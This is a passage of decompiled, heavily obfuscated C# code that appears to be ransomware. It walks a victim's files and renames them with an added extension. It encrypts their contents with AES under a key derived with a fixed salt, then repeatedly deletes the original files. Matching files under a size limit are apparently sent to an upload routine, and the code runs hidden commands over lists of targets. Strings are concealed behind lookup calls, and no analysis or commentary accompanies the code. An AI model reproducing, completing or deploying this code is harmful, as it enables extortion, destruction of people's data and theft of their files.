&& !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401326)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401341)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401315)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401262)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401237)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401252)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401203)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401218)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401169)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401184)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401135)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401150)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401105)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401116)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400559)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400578)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400529)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400544)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107400495))) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400470)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107396745)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400457)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(MlhxfWYHvBPnrE.getString_0(107400432)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(MlhxfWYHvBPnrE.getString_0(107400427)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(MlhxfWYHvBPnrE.getString_0(107400454)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(MlhxfWYHvBPnrE.getString_0(107400449)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400444)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(IKRtRLOSqagD))
			{
				if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
				{
					if (NgbDiBVJKDTW == MlhxfWYHvBPnrE.getString_0(107396892))
					{
						try
						{
							if (gTLpLXyJzZQWL.MGCzqHggmAUsoR(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
							{
								gTLpLXyJzZQWL.UibMaZyBJndO(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
							}
						}
						catch
						{
						}
					}
					JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
					{
						IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
					}
					wvGfPUgIYOBF(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					try
					{
						new hBrzirNLAz().GKYsKpmSoqlXyDMz(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (SidumIOOlYmWUm)
								{
									Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349507) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107349430) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + MlhxfWYHvBPnrE.getString_0(107349441));
									Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349432));
								}
							}
							catch
							{
							}
							avwQPvqZWjHd(UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348783)), MlhxfWYHvBPnrE.getString_0(107400328) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107400328) + UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348758)) + MlhxfWYHvBPnrE.getString_0(107400328) + Environment.UserName + MlhxfWYHvBPnrE.getString_0(107400328) + UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348773)));
						}
					}
					catch (Exception ex2)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107348716) + ex2.Message + MlhxfWYHvBPnrE.getString_0(107396659));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107348667) + ex4.Message + MlhxfWYHvBPnrE.getString_0(107396659));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_085c_2;
						}
						if (krdgQbbXWsBnkAs == MlhxfWYHvBPnrE.getString_0(107396892) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
								{
									if (OtvlrYHFRq)
									{
										CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
									}
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
								}
							}
							catch (Exception ex6)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107349118) + ex6.Message + MlhxfWYHvBPnrE.getString_0(107396659));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
							{
								CS_0024_003C_003E8__locals0.tDwFwsGDrP += CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
							}
							if (pRibgXhmfietto == MlhxfWYHvBPnrE.getString_0(107396892))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in tnUDcbYyevrzGRJA)
									{
										if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107396898))
										{
											if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
											{
												try
												{
													hIHAEKpEeiS.SRnkQsJyJfqDTNo(MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402163), MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402158), MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402177), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item3) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107397155))
										{
											try
											{
												hIHAEKpEeiS.SRnkQsJyJfqDTNo(MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402163), MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402158), MlhxfWYHvBPnrE.UgmkrRPmQyDLrq.getString_0(107402177), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
							string text2 = MlhxfWYHvBPnrE.getString_0(107401596);
							text2 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : MlhxfWYHvBPnrE.getString_0(107401596));
							string s = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dhEsUcbXeBeyR == MlhxfWYHvBPnrE.getString_0(107397149))
							{
								byte[] array = null;
								byte[] byte_ = PsMAbAPGwNaiG.jZLDTviUrm(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
								if (!PsMAbAPGwNaiG.teuDisObNXw(ipZGIkDRDrXd: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), TTIkAHWRYFFqFLX: CS_0024_003C_003E8__locals0.tDwFwsGDrP, ecklbfBlPisB: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UpNccIaFzBadyA)
							{
								if (!kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (OtvlrYHFRq)
							{
								CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
							}
							string text3 = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
							string text4 = MlhxfWYHvBPnrE.getString_0(107401596);
							text4 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : MlhxfWYHvBPnrE.getString_0(107401596));
							string s2 = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
							{
								if (!NbfRNVirWcO)
								{
									if (!UpNccIaFzBadyA)
									{
										QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
									}
									else
									{
										QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!UpNccIaFzBadyA)
										{
											elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
										}
										else
										{
											elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SWaMdrdKGgzowGl)
										{
											try
											{
												File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107397823) + ex11.Message + MlhxfWYHvBPnrE.getString_0(107396659));
											}
											catch (Exception)
											{
											}
										}
										ZzaknwGiCeEd++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107397800), nQCMwcWKyQk);
								}
								else
								{
									QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107397800), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107397823) + ex14.Message + MlhxfWYHvBPnrE.getString_0(107396659));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									return;
								}
							}
							if (UpNccIaFzBadyA)
							{
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
								{
									wTxBRYOuXVKuCY(CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes2);
								}
								else
								{
									wTxBRYOuXVKuCY(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		});
	}

	private static void QcpcdaqzGiHI(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pRibgXhmfietto == getString_0(107396872))
					{
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396872))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107397129))
							{
								try
								{
									hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107397780)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107397780), getString_0(107401576)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void elqAHaVgaqSN(string XDQvJJWFoDNbO, string EJgmKuqqZDkKf, byte[] VYgJzesaqXkDmOhf, byte[] grpyXuXYkEmBw = null)
	{
		try
		{
			if (pRibgXhmfietto == getString_0(107396872))
			{
				FileStream fileStream = new FileStream(XDQvJJWFoDNbO, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (XDQvJJWFoDNbO.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396872))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), XDQvJJWFoDNbO);
							}
							catch
							{
							}
						}
					}
					else if (XDQvJJWFoDNbO.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107397129))
					{
						try
						{
							hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), XDQvJJWFoDNbO);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (XDQvJJWFoDNbO != EJgmKuqqZDkKf)
		{
			File.Move(XDQvJJWFoDNbO, EJgmKuqqZDkKf);
			XDQvJJWFoDNbO = EJgmKuqqZDkKf;
		}
		byte[] bytes = mbmsUAuYimuL.UGIyKRILFxs(File.ReadAllBytes(XDQvJJWFoDNbO), VYgJzesaqXkDmOhf, grpyXuXYkEmBw);
		File.WriteAllBytes(XDQvJJWFoDNbO, bytes);
		DPjjDEUnrYJ++;
	}

	private static void QTDQnApWjFz(string string_0, string string_1, byte[] byte_0)
	{
		LerVzbXIIhQ CS_0024_003C_003E8__locals0 = new LerVzbXIIhQ();
		CS_0024_003C_003E8__locals0.JgoRvgBlnpx = string_0;
		CS_0024_003C_003E8__locals0.pnnxcTqhyFOc = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string pnnxcTqhyFOc = CS_0024_003C_003E8__locals0.pnnxcTqhyFOc;
			FileStream fileStream = new FileStream(pnnxcTqhyFOc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (RrpEvBQBLONZKo == getString_0(107396872))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Length > 0)
				{
					if (pRibgXhmfietto == getString_0(107396872))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.JgoRvgBlnpx, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in tnUDcbYyevrzGRJA)
						{
							if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396872))
							{
								if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.JgoRvgBlnpx.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107397129))
							{
								try
								{
									hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.JgoRvgBlnpx);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.EndsWith(getString_0(107397780)))
					{
						File.Move(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc, CS_0024_003C_003E8__locals0.pnnxcTqhyFOc.Replace(getString_0(107397780), getString_0(107401576)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.pnnxcTqhyFOc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398557) + CS_0024_003C_003E8__locals0.JgoRvgBlnpx + getString_0(107397803) + ex2.Message + getString_0(107396639));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = tKhSHdXkDw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398230)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398249)), string_0);
			};
		}
		Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (XxUTdtdLXHJQFmlnR == getString_0(107396872))
		{
			string[] source2 = upziyoWzyCa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398249)), getString_0(107398224) + string_0 + getString_0(107398215));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!MVOTvzaISsBSX().Contains(getString_0(107397911)))
		{
			HkTGZrARipJDX(fJgPhlsQHtYagv);
		}
		else
		{
			List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					avwQPvqZWjHd(UJcPFgFtVJhWf(TZnpCqEjJZon(getString_0(107398178))), string_0);
				};
			}
